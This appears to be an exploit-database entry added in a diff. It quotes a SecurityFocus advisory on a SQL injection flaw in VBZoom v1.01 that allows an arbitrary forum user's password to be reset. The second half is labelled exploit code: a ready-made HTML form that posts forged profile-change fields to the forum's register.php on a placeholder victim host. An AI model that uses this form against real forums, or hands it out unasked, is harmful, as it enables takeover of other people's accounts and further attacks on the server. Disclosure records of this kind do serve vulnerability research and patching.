@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/5919/info
+
+A SQL injection vulnerability has been discovered in VBZoom v1.01.
+
+Due to insufficient sanitization of variables used to construct SQL queries, it is possible to modify the logic of a query, via a malicious request.
+
+Exploiting this issue could allow an attacker to reset the password of an arbitrary forum user. The ability to impersonate arbitrary users could potentially allow an attacker to launch further attacks against the vulnerable server.
+
+Other SQL injection attacks may also be possible.
+
+
+Exploit code
+**************
+<form name="f1" action="http://www.victim.com/vbzoom/register.php"
+method="POST">
+<input type="hidden" name="ChangeProfile" value="1">
+User Name: <input type="text" name="UserName"><br>
+Password: <input type="text" name="Password"><br>
+Email: <input type="text" name="Email">
+<input type="hidden" name="HomePage" value="lamerZ">
+<input type="hidden" name="VBZooMForumCookiesUserName" value="false">
+<input type="hidden" name="VBZooMForumCookiesUserName" value="false">
+<input type="submit" value="reset password">
+</form>
